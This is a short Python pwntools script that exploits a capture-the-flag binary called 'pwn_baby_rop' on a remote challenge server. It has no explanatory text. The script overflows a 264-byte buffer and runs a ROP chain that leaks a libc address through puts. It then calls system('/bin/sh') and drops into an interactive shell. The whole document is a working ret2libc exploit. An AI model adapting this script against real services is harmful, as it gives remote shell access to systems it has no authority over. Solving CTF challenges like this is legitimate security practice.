
from pwn import *

# r = process('./pwn_baby_rop')
r = remote('34.107.22.248', 30408)
# elf = ELF('/lib/x86_64-linux-gnu/libc.so.6')
elf = ELF('./libc6_2.31-0ubuntu9_amd64.so')

puts = elf.sym['puts']
pop_rdi = 0x0000000000401663  # : pop rdi; ret;

p = b'A' * 264
p += p64(pop_rdi)
p += p64(0x0404018)
p += p64(0x0401030)
p += p64(0x0401176)

r.readline()
r.sendline(p)
leak = int.from_bytes(r.readline().strip(), byteorder='little')
# print(hex(leak))
LIBC_BASE = leak - puts
ADDR_BINSH = next(elf.search(b'/bin/sh')) + LIBC_BASE
ADDR_SYSTEM = elf.symbols['system'] + LIBC_BASE

p = b'A' * 264
p += p64(pop_rdi+1)
p += p64(pop_rdi)
p += p64(ADDR_BINSH)
p += p64(ADDR_SYSTEM)

r.sendline(p)

r.interactive()
